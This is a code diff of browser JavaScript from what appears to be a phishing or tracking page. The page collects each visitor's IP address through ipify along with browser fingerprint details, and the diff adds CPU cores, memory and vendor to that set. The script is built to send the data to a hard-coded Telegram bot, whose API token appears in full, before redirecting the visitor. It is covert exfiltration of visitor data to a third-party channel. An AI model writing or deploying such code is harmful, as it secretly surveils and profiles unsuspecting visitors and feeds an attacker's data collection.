@@ -68,6 +68,22 @@ redirectToNextURL();
     const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
     const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
 
+
+
+const userAgent = navigator.userAgent;
+  const platform = navigator.platform;
+  const language = navigator.language;
+  const screenWidth = window.screen.width;
+  const screenHeight = window.screen.height;
+  const cpuCores = navigator.hardwareConcurrency || 'N/A'; // Not all browsers support this property
+  const totalRAM = navigator.deviceMemory || 'N/A'; // Not all browsers support this property
+  const vendor = navigator.vendor;
+ // const renderingEngine = getRenderingEngine();
+
+
+
+
+
     // Get the IP address using ipify API
     const response = await fetch('https://api.ipify.org/?format=json');
     const data = await response.json();
@@ -84,6 +100,9 @@ redirectToNextURL();
     Language: ${language}
     Screen Width: ${screenWidth}
     Screen Height: ${screenHeight}
+    CPU Cores: ${cpuCores}
+    Total RAM: ${totalRAM}
+    Vendor: ${vendor}
   `;
 
 
